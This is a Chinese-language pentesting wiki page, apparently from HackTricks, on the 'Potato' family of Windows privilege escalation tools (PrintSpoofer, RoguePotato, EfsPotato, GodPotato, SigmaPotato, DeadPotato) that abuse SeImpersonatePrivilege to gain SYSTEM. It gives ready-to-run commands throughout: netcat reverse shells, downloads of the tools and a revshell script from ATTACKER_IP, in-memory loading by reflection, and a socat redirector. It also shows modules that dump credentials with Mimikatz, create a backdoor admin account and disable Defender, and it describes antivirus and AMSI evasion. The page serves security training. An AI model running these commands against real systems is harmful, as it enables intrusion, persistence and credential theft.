# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato 在 Windows Server 2019 和 Windows 10 build 1809 及更高版本中无法使用**。不过，可以使用 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、**[**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、**[**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**、**[**GodPotato**](https://github.com/BeichenDream/GodPotato)**、**[**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**、**[**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** 利用相同的权限，获取 `NT AUTHORITY\SYSTEM`** 级别的访问权限。这篇[博客文章](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)深入介绍了 `PrintSpoofer` 工具。该工具可在 JuicyPotato 已无法使用的 Windows 10 和 Server 2019 主机上滥用 impersonation 权限。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> SigmaPotato（GodPotato 的一个 fork）是一个在 2024–2025 年仍经常维护的现代替代方案，支持内存中/.NET reflection 使用方式，并扩展了 OS 支持范围。下方提供了快速用法，仓库链接见 References。

相关背景和手动技术页面：

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 要求和常见注意事项

以下所有技术都依赖于滥用具有 impersonation 能力的特权 service；执行环境必须持有以下任一权限：

- SeImpersonatePrivilege（最常见）或 SeAssignPrimaryTokenPrivilege
- 如果 token 已具有 SeImpersonatePrivilege，则不要求高完整性（许多 service account 通常具备此权限，例如 IIS AppPool、MSSQL 等）

快速检查权限：

```cmd
whoami /priv | findstr /i impersonate
```

操作说明：

- 如果你的 shell 运行在缺少 SeImpersonatePrivilege 的受限 token 下（某些场景中的 Local Service/Network Service 常见此情况），使用 FullPowers 恢复该账户的默认权限，然后运行 Potato。例如：`FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- 一个进程 token 的权限可能少于同一服务账户或登录会话的另一个 token。在某些配置中，同一会话中的命名管道客户端可能会暴露具有 SeImpersonatePrivilege 的另一个 token，但服务配置的 `RequiredPrivileges` 和 `whoami /priv` 描述的是不同内容，不能证明此类 token 可用。在考虑使用模拟路径前，请先验证实际 token。
- PrintSpoofer 需要 Print Spooler 服务正在运行，并且可通过本地 RPC 端点 (spoolss) 访问。在 PrintNightmare 之后禁用了 Spooler 的加固环境中，优先使用 RoguePotato/GodPotato/DCOMPotato/EfsPotato。
- RoguePotato 需要可通过 TCP/135 访问的 OXID resolver。如果出站流量被阻止，请使用 redirector/端口转发器（见下方示例）。检查当前使用的构建版本支持哪些标志。
- EfsPotato/SharpEfsPotato 滥用 MS-EFSR；如果某个管道被阻止，请尝试其他管道 (lsarpc, efsrpc, samr, lsass, netlogon)。
- RpcBindingSetAuthInfo 期间出现错误 0x6d3，通常表示 RPC 身份验证服务未知或不受支持；请尝试不同的管道/传输方式，或确认目标服务正在运行。
- 像 DeadPotato 这样的“大杂烩” fork 会捆绑额外的 payload 模块（Mimikatz/SharpHound/关闭 Defender），这些模块会写入磁盘；与精简版原版相比，预计更容易被 EDR 检测到。

## 快速演示

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

注意：
- 可以使用 `-i` 在当前控制台中启动交互式进程，或使用 `-c` 运行单行命令。
- 需要 Spooler 服务。如果该服务已禁用，此操作将失败。

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

在 [upstream usage](https://github.com/antonioCoco/RoguePotato#usage) 中，`-e` 用于指定命令，`-l` 用于选择本地解析器端口，可选的 `-c` 用于选择 CLSID。如果 COM 激活启动的服务，其可执行文件路径已被修改，那么该服务无需令牌模拟即可执行被修改后的命令；在将观察到的 SYSTEM 执行归因于此技术之前，请先检查服务配置。

如果出站 135 端口被阻止，可通过 redirector 上的 socat 转发 OXID resolver：<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato 是一种于 2022 年末发布的较新 COM 滥用原语，针对的是 **PrintNotify** 服务，而非 Spooler/BITS。该二进制文件会实例化 PrintNotify COM server，替换为伪造的 `IUnknown`，然后通过 `CreatePointerMoniker` 触发特权回调。当以 **SYSTEM** 身份运行的 PrintNotify 服务回连时，进程会复制返回的令牌，并以完整权限启动指定的 payload。<sup>[[13]](#references)</sup>

主要操作说明：

* 只要安装了 Print Workflow/PrintNotify 服务（即使在 PrintNightmare 之后禁用了旧版 Spooler，该服务仍然存在），就适用于 Windows 10/11 和 Windows Server 2012–2022。
* 调用上下文必须具有 **SeImpersonatePrivilege**（IIS APPPOOL、MSSQL 和计划任务服务帐户通常具备该权限）。
* 支持直接执行命令，也支持交互模式，因此你可以留在原始控制台中。示例：

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* 由于它完全基于 COM，因此无需命名管道监听器或外部重定向器，可在 Defender 阻止 RoguePotato 的 RPC 绑定的主机上直接替代 RoguePotato。

Ink Dragon 等操作人员会在通过 SharePoint 获得 ViewState RCE 后立即运行 PrintNotifyPotato，从 `w3wp.exe` 工作进程提权至 SYSTEM，然后安装 ShadowPad。<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

提示：如果一个 pipe 失败或被 EDR 拦截，请尝试其他受支持的 pipe：

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

注意：
- 在具有 SeImpersonatePrivilege 的情况下，适用于 Windows 8/8.1–11 和 Server 2012–2022。
- 获取与已安装运行时匹配的二进制文件（例如，在现代 Server 2022 上使用 `GodPotato-NET4.exe`）。
- 如果初始执行原语是超时时间较短的 webshell/UI，请将 payload 暂存为脚本，并让 GodPotato 运行该脚本，而不要使用较长的内联命令。<sup>[[12]](#references)</sup>

从可写 IIS webroot 快速暂存的模式：

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato 提供两个变体，针对默认使用 RPC_C_IMP_LEVEL_IMPERSONATE 的服务 DCOM 对象。构建或使用提供的二进制文件，然后运行你的命令：

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato（更新版 GodPotato fork）

SigmaPotato 添加了许多现代化功能，例如通过 .NET reflection 在内存中执行，以及 PowerShell reverse shell helper。<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

2024–2025 版本（v1.2.x）的额外优点：
- 内置 reverse shell 标志 `--revshell`，并移除了 PowerShell 的 1024 字符限制，因此可以一次性执行较长的 AMSI 绕过 payload。
- 支持便于反射调用的语法（`[SigmaPotato]::Main()`），并通过 `VirtualAllocExNuma()` 实现一种简单的 AV 规避技巧，以迷惑简单的启发式检测。
- 单独提供针对 .NET 2.0 编译的 `SigmaPotatoCore.exe`，用于 PowerShell Core 环境。

### DeadPotato（2024 年基于 GodPotato 重构并加入模块）

DeadPotato 保留了 GodPotato 的 OXID/DCOM impersonation 链，同时内置 post-exploitation 辅助功能，使操作者可以立即获取 SYSTEM 权限，并执行持久化/收集操作，无需额外工具。<sup>[[15]](#references)</sup>

常用模块（均需要 SeImpersonatePrivilege）：

- `-cmd "<cmd>"` — 以 SYSTEM 身份启动任意命令。
- `-rev <ip:port>` — 快速建立 reverse shell。
- `-newadmin user:pass` — 创建本地管理员账号以实现持久化。
- `-mimi sam|lsa|all` — 部署并运行 Mimikatz 以转储凭据（会写入磁盘，动静较大）。
- `-sharphound` — 以 SYSTEM 身份运行 SharpHound 收集数据。
- `-defender off` — 关闭 Defender 实时保护（动静很大）。

单行命令示例：

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

由于它会携带额外的二进制文件，预计会触发更多 AV/EDR 告警；注重隐蔽性时，请使用更精简的 GodPotato/SigmaPotato。

## References

- [1] [PrintSpoofer – 在 Windows 10 和 Server 2019 上滥用 impersonation 权限](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [JuicyPotato 不再可用？旧事一桩，欢迎 RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – 为服务帐户恢复默认令牌权限](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction 指向 webroot 并实现 RCE → 使用 FullPowers + GodPotato 提权至 SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice 宏 → IIS webshell → 使用 GodPotato 提权至 SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – 深入 Ink Dragon：揭示隐蔽攻击行动的中继网络与内部运作机制](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – 内置 post-ex 模块的 GodPotato 重制版](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
